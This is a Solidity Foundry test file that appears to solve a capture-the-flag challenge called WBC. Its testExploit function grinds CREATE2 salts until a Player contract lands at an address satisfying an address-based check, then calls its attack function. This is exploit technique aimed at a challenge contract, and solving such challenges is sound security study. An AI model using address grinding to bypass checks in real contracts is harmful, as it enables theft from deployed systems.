// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Test} from "forge-std/Test.sol";
import {WBC, WBCBase} from "src/WBC/WBC.sol";
import {Player} from "src/WBC/Player.sol";

contract WBCTest is Test {
    WBCBase public base;
    WBC public wbc;

    uint256 count;

    function setUp() external {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        base = new WBCBase(startTime, endTime, fullScore);
        base.setup();
        wbc = base.wbc();
    }

    function testExploit() external {
        bytes32 bytecode = keccak256(abi.encodePacked(type(Player).creationCode, uint256(uint160(address(wbc)))));

        Player p;
        for (uint256 i;; ++i) {
            address addr = computeCreate2Address(bytes32(i), bytecode);

            if (uint256(uint160(addr)) % 100 == 10) {
                p = new Player{salt: bytes32(i)}(address(wbc));
                break;
            }
        }

        p.attack();
    }
}
